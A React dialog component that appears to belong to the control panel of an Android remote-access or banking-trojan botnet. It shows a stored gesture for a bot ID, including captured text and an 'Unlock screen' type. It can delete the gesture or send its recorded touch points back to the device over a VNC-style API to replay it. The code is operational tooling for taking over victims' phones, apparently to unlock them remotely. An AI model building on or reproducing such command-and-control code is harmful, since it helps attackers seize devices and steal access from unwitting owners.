import React, { useState, useEffect, useRef } from 'react'
import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faPaperPlane, faLink, faTowerCell, faUnlock, faLockOpen, faPlay, faAppleAlt, faFileText, faTrash } from '@fortawesome/free-solid-svg-icons';
import { borderRadius } from '@mui/system';
import $ from 'jquery';
import SettingsContext from 'src/settings';

import TextField from '@mui/material/TextField';

import Notification from '../Notification/Notification';


export default function Gesture(props) {

    const { open,handleClose, idbot, gesture} = props;

    const handleexecrecordedgesture = (pos) => {
      
      let newpos = Object.fromEntries(
        Object.entries(pos).map(([key, value]) => [
          key,
          {
            ...value,
            dur: 200,
            last: 100,
          },
        ]));
      
        console.log(Object.values(newpos))
    
      let commandreq = {
        "id": idbot,
        "command": "action_recorded_gesture",
        "data" : {
          "pos": Object.values(newpos),
        }
      };
      sendCommand(commandreq);
    }

    const delGesture = async (id) => {
      try {
        const response = await fetch('/api/gestures/del_gesture', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ idbot: idbot, idgesture: id }),
        });
  
        if (response.ok) {
          const data = await response.json();
          console.log(data);
          getGestures();
        } else {
          console.log('Request failed');
        }
      } catch (error) {
        console.log('Error:', error);
      }
  
    };


      const sendCommand = (commandreq) => {
          let request = $.ajax({
            type: 'POST',
            url: SettingsContext.vncApiUrl + "/api",
            data: JSON.stringify(commandreq)
        });
      }

    const [notificationVisible, setNotificationVisible] = useState(false)
    const [Pushseverity, setPushSeverity] = useState("success")
    const [Pushtitle, setPushTitle] = useState("Success")
    const [Pushmessage, setPushMessage] = useState("success")

    const sendPush = (severity, title, message) => {
        setPushSeverity(severity)
        setPushTitle(title)
        setPushMessage(message)
        setNotificationVisible(true);
        setTimeout(() => {
          setNotificationVisible(false);
        }, 5000);
      };
    
    return (
        
        <Dialog open={open} onClose={handleClose} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={250}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faUnlock}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Gesture Info</Typography>
                        
                    </Box>
                    

                    <Button
                        onClick={()=>{handleClose()}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
                    </Button>
                    </div>
                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    mt={3}
                    height={45}
                    width={320}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faAppleAlt}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Type:</Typography> <Typography ml={1} variant='h6' color="primary.contrastText" >{gesture.type === "unlock" ? "Unlock screen" : gesture.type === "rec" ? "Recording" : gesture.type}</Typography> 
                        
                    </Box>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    display="flex"
                    mt={2}
                    height={200}
                    width={320}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faFileText}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Text: {JSON.parse(gesture.text).join(", ")}</Typography>
                        
                    </Box>

                  
                    <div style={{ display: 'flex', justifyContent: 'flex-start' }}>
                    <Button onClick={()=> {{ delGesture(gesture.uuid); sendPush("success","Success","Deleted Popup"); }}} sx={{mt: 3, width: 150, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faTrashCan} /></SvgIcon>)}variant="contained">Delete</Button>
                    <Button onClick={() => {handleexecrecordedgesture(JSON.parse(gesture.gesture)["points"])}} sx={{marginLeft: 12 ,mt: 3, width: 80, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane}></FontAwesomeIcon></SvgIcon>)} variant="contained">Send</Button>
                    </div>
            </DialogContent>
            {notificationVisible && (
                <Notification
                severity={Pushseverity}
                title={Pushtitle}
                message={Pushmessage}
                duration={5000}
                />
            )}
        </Dialog>
    )
}
